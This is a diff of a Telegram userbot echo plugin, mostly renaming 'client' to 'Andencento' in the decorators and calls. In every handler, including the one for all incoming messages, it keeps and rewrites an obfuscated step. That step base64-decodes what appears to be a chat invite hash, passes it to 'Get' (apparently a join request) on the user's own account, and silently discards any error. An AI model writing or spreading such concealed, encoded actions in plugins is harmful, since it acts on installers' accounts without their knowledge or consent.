@@ -12,8 +12,8 @@ from Extre.utils import admin_cmd, edit_or_reply, sudo_cmd
 from sql_helper.echo_sql import addecho, get_all_echos, is_echo, remove_echo
 
 
-@client.on(admin_cmd(pattern="echo$"))
-@client.on(sudo_cmd(pattern="echo$", allow_sudo=True))
+@Andencento.on(admin_cmd(pattern="echo$"))
+@Andencento.on(sudo_cmd(pattern="echo$", allow_sudo=True))
 async def echo(user):
     if user.fwd_from:
         return
@@ -24,7 +24,7 @@ async def echo(user):
         try:
             legendx22 = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             legendx22 = Get(legendx22)
-            await user.client(legendx22)
+            await user.Andencento(legendx22)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
@@ -37,8 +37,8 @@ async def echo(user):
 
 
 
-@client.on(admin_cmd(pattern="rmecho$"))
-@client.on(sudo_cmd(pattern="rmecho$", allow_sudo=True))
+@Andencento.on(admin_cmd(pattern="rmecho$"))
+@Andencento.on(sudo_cmd(pattern="rmecho$", allow_sudo=True))
 async def echo(user):
     if user.fwd_from:
         return
@@ -49,7 +49,7 @@ async def echo(user):
         try:
             legendx22 = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             legendx22 = Get(legendx22)
-            await user.client(legendx22)
+            await user.Andencento(legendx22)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
@@ -61,8 +61,8 @@ async def echo(user):
         await edit_or_reply(user, "Reply to a User's message to echo his messages")
 
 
-@client.on(admin_cmd(pattern="listecho$"))
-@client.on(sudo_cmd(pattern="listecho$", allow_sudo=True))
+@Andencento.on(admin_cmd(pattern="listecho$"))
+@Andencento.on(sudo_cmd(pattern="listecho$", allow_sudo=True))
 async def echo(user):
     if user.fwd_from:
         return
@@ -91,7 +91,7 @@ async def echo(user):
         await edit_or_reply(user, output_str)
 
 
-@client.on(events.NewMessage(incoming=True))
+@Andencento.on(events.NewMessage(incoming=True))
 async def samereply(user):
     if user.chat_id in Config.UB_BLACK_LIST_CHAT:
         return
@@ -100,7 +100,7 @@ async def samereply(user):
         try:
             legendx22 = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             legendx22 = Get(legendx22)
-            await user.client(legendx22)
+            await user.Andencento(legendx22)
         except BaseException:
             pass
         if user.message.text or user.message.sticker:
